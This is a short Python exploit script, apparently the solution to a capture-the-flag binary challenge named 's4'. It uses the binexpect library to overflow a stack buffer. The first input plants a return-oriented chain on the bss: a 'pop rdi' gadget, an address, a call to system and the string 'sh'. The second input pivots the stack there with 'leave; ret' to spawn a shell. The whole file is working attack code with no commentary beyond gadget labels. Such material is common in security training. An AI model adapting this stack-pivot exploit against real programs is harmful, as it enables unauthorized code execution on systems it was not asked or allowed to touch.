#!/usr/bin/env python

import binexpect
import struct

if __name__ == "__main__":

    setup = binexpect.setup('./s4')
    target = setup.target()
    target.setecho(False)

    # setting future stack on the bss
    stage1 = b'A' * 0x3d8 # padding
    stage1 += struct.pack('L', 0x4007e3) # pop rdi; ret
    stage1 += struct.pack('L', 0x601490) # pop'd
    stage1 += struct.pack('L', 0x400772) # system
    stage1 += b'sh'.ljust(8, b'\x00')    # "sh"
    target.tryexpect('What is your name?')
    target.sendbinline(stage1)

    # trigger stack pivot
    payload = b'A' * 0x30
    payload += struct.pack('L', 0x601470) # bss + 0x3d8 bytes
    payload += struct.pack('L', 0x40077c) # leave; ret (pivot)

    target.tryexpect('What is your password?')
    target.sendbinline(payload)

    target.tryexpect("If you're cool you'll get a shell.")
    target.pwned()

